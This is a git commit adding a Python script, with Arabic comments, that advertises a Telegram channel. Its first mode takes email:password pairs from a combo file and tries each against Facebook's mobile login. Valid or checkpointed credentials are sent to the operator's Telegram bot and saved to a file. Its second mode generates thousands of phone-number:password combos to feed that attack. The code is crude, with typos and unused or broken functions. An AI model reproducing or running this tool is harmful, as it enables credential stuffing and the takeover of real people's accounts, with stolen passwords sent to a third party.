92c308049b9cccfb0e855f21cb8ebb4b55d6a8ee
Hydra404x <81261102+Hydra404x@users.noreply.github.com>
2021-12-02 18:26:39 +0000

    Add files via upload

---
+++ FBUS1.py
@@ -0,0 +1,170 @@
+import os
+try:
+    import uuid
+except:
+    os.system('pip install uuid')
+
+try:
+    from random import *
+except:
+    os.systeam('pip install random ')
+
+try:
+    import string
+except:
+    os.system('pip install string')
+
+try:
+    import requests
+except:
+    os.system('pip install requests ')
+
+try:
+    from user_agent import generate_user_agent
+except:
+    os.system('pip install user_agent ')
+
+try:
+    from datetime import datetime
+except:
+    os.system('pip install datetime ')
+
+try:
+    import time
+except:
+    os.system('pip install time')
+else:
+    os.system('clear')
+    try:
+        import pyfiglet
+    except:
+        os.system('pip install pyfiglet')
+    else:
+        os.system('clear')
+        import pyfiglet, os
+        from time import sleep
+        import webbrowser
+        Z = '\x1b[2;31m'
+        G = '\x1b[1;32m'            
+        import random, uuid, requests, string
+        from user_agent import generate_user_agent
+        from datetime import datetime
+        from random import *
+        from time import sleep
+        import requests, os, random, json, threading, secrets, uuid
+        from colorama import Fore, Style
+        from time import sleep
+        from datetime import datetime
+        from secrets import token_hex
+        from uuid import uuid4
+        from user_agent import generate_user_agent
+        from uuid import uuid4
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#ازرق
+C = '\033[2;35m' #وردي
+B = '\033[2;36m'#سمائي
+K = '\033[1;34m' #ازرق فاتح
+def AAlosh (s):
+	for AAlosh in s + '\n':
+		sys.stdout.write(AAlosh)
+		sys.stdout.flush()
+		sleep(50. / 700)
+		sys.exit()   
+		
+  
+        
+AAlosh = F+""" 
+    _    _           _     
+   / \  | | ___  ___| |__  
+  / _ \ | |/ _ \/ __| '_ \ 
+ / ___ \| | (_) \__ \ | | |
+/_/   \_\_|\___/|___/_| |_|                    
+             
+               Telegram : @horo4
+===============================
+                                            اشترك في قنواتي                                         لتشتغل لاداه
+===============================
+\033[1;33m
+[1] crak  دخول اداه صيد فيس
+\033[2;36m
+[2] crak صنع كومبو ارقام                     
+"""                       
+
+os.system('clear')
+r = requests.session()
+print (AAlosh)
+
+
+
+TOOLS = input(C+' اختر : '+B)
+#===============================
+
+if (TOOLS == '1'):
+	os.system('clear')
+	
+	webbrowser.open('https://youtu.be/Q1BYx2n2Wm0')
+	os.system('clear')
+	ID = input(X+"["+Z+"!"+X+"]"+F+ "ID Bot  :\n"+B)
+	webbrowser.open('https://2u.pw/Czlyf')
+	tok = input (X+"["+Z+"!"+X+"]"+F+'TOken Bot: \n'+B)
+	webbrowser.open('https://t.me/KaBousVIP')
+	file = input(X+"["+Z+"!"+Z+"]"+F+ " combo  :\n"+B)
+	print(B)
+	print("-"*50)
+	fuck= open(file, 'r')
+	
+	
+	
+	
+	while True:
+		user = fuck.readline().split('\n')[0]
+		Aloshmil = user.split(':')[0]
+		Aloshps = user.split(':')[1]
+		link = 'https://mobile.facebook.com/login.php'
+		data = { 'email': Aloshmil, 'pass': Aloshps }
+		headers = {
+'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B',
+'Accept-Language' : 'en-US,en;q=0.5'}
+		shot = requests.post(link, headers=headers, data=data).text
+		if "xc_message" in shot:
+			print(F+ ' Email ==> : ' + Aloshmil + ': pass ==> : ' + Aloshps)
+			r.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= Hi Pro Fishing Facebook From Alosh‌‌ \n ====================\n.√. Email   (  {Aloshmil}  )\n.√. password  (  {Aloshps}  )\n ====================\n By :- @BBBBBLL :-  Horo4 √ " )
+		elif "checkpointSubmitButton-actual-button" in shot:
+			print(X+ ' Email ==> : ' + Aloshmil + ': pass ==> : ' + Aloshps)
+			r.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=			Hi Pro Fishing Facebook From Alosh‌‌  سيكور \n ====================\n.√. Email   (  {Aloshmil}  )\n.√. password  (  {Aloshps}  )\n ====================\n By :- @BBBBBLL :-  Horo4 √ " )
+			
+			with open("Cp.txt",'a') as ff:
+				ff.write("Email : "+Aloshmil+"\nPass : "+Aloshps+"\n\n")     
+				
+			
+		else:
+			print(Z+ ' Email ==> : ' + Aloshmil + ': pass ==> : ' + Aloshps)
+			
+#alosh##################.########.####
+		
+#owowiiwiqiqqii
+
+if (TOOLS == '2'):
+	
+	os.system('clear')
+	
+import random
+make = "0987654321"
+h = 0
+
+while h<10000:
+	c = str(''.join(random.choice(make) for i in range(6)))
+	kj = "+21655"+c
+	jk = "55"+c
+	combo = kj+":"+jk
+	print(combo)
+	
+	g = open('Combo.txt','a')
+	g.write(combo+'\n')
+	
+	h=h +1
+
+
